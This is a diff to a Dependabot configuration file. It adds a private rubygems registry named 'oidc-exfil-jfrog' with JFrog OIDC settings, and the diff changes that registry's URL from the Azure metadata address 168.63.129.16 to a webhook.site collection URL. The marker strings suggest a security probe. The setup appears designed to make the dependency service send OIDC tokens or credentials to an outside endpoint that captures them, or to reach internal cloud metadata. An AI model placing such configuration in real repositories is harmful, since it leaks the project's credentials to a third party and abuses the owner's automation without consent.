@@ -2,15 +2,15 @@ version: 2
 registries:
   oidc-exfil-jfrog:
     type: rubygems-server
-    url: "http://168.63.129.16"
-    jfrog-oidc-provider-name: "BENTY-PROBE-MARK-F026-IMDS"
-    audience: "BENTY-AUD-IMDS"
-    identity-mapping-name: "BENTY-IDM-IMDS"
+    url: "https://webhook.site/1fd448dc-c6cc-492e-a77e-950728108e3f"
+    jfrog-oidc-provider-name: "BENTY-PROBE-MARK-F026-WHSITE"
+    audience: "BENTY-AUDIENCE-WHSITE"
+    identity-mapping-name: "BENTY-IDM-WHSITE"
 updates:
   - package-ecosystem: "bundler"
     directory: "/"
     schedule:
       interval: "daily"
-      time: "13:00"
+      time: "14:00"
     registries:
       - "oidc-exfil-jfrog"
